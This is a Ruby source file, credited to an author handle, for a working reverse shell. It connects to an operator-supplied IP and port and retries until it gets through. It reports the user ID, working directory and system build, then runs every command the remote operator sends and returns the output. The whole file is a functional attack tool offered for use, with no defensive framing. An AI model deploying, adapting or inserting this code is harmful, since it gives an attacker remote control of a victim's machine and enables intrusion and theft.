#!/usr/bin/env ruby
# Ruby Reverse Shell
# By: Hood3dRob1n
#
# ./rubyrev.rb IP PORT
#

require 'socket'
require 'open3'

#Add some color without colorize gem since we sticking to std libs :)
RS="\033[0m"    # reset
HC="\033[1m"    # hicolor
FRED="\033[31m" # foreground red
FGRN="\033[32m" # foreground green
FWHT="\033[37m" # foreground white

trap("SIGINT") {puts "\n\n#{HC}#{FRED}WARNING! CTRL+C Detected closing Socket connection#{FWHT}.....#{RS}"; exit 666;}

begin
	socket = TCPSocket.new "#{ARGV[0]}", "#{ARGV[1]}" #establish socket connection object using provided IP & PORT
rescue
	#If we fail to connect, wait a few and try again or user cancles shit
	sleep 10
	retry
end

#Runs the commands you type and sends you back the stdout and stderr.
#Shell Action...
begin
	socket.puts "#{HC}#{FGRN}This Reverse connection brought to you by a little Ruby Magic#{FWHT} xD#{RS}\n\n"
	socket.puts "#{HC}#{FGRN}Server Info#{FWHT}:#{RS}"
	count=0
	#First we scrape some basic info....
	if RUBY_PLATFORM =~ /win32/ 
		while count.to_i < 3
			if count.to_i == 0
				command="whoami"
				socket.print "#{HC}#{FGRN}ID#{FWHT}: #{RS}"
			elsif count.to_i == 1
				command="chdir"
				socket.print "#{HC}#{FGRN}PWD#{FWHT}: #{RS}"
			elsif count.to_i == 2
				command="echo Winblows"
				socket.print "#{HC}#{FGRN}BUILD#{FWHT}: #{RS}\n"
			end
			count += 1
			#Use open3 to execute commands as we read and write through socket connection
			Open3.popen2e("#{command}") do | stdin, stdothers |
				IO.copy_stream(stdothers, socket)
			end
		end
	else
		while count.to_i < 3
			if count.to_i == 0
				command="id"
				socket.print "#{HC}#{FGRN}ID#{FWHT}: #{RS}"
			elsif count.to_i == 1
				command="pwd"
				socket.print "#{HC}#{FGRN}PWD#{FWHT}: #{RS}"
			elsif count.to_i == 2
				command="uname -a"
				socket.print "#{HC}#{FGRN}BUILD#{FWHT}: #{RS}\n"
			end
			count += 1
			#Use open3 to execute commands as we read and write through socket connection
			Open3.popen2e("#{command}") do | stdin, stdothers |
				IO.copy_stream(stdothers, socket)
			end
		end
	end
	#Then we drop to sudo shell :)
	@work=Dir.pwd #var for keeping a working path so 'cd' works (for the most part)
	while(true)
		socket.print "\n#{HC}#{FWHT}(#{FGRN}GreenShell#{FWHT})#{FGRN}>#{RS}"
		command = socket.gets.chomp
		if command.downcase == 'exit' or command.downcase == 'quit'
			socket.puts "\n#{HC}#{FGRN}got r00t#{FWHT}?#{RS}\n\n"
			break #Exit when asked nicely :p
		end
		if command.downcase =~ /cd (.+)/i #our mini block to handle change directory requests
			Dir.chdir("#{$1}") do |dir|
				@work = Dir.pwd
			end
		end
		#Use open3 to execute commands as we read and write through socket connection
		Open3.popen2e("cd #{@work} && #{command}") do | stdin, stdothers |
			IO.copy_stream(stdothers, socket)
        	end
	end
rescue
	#If we fail for some reason, try again
	retry
end
#EOF
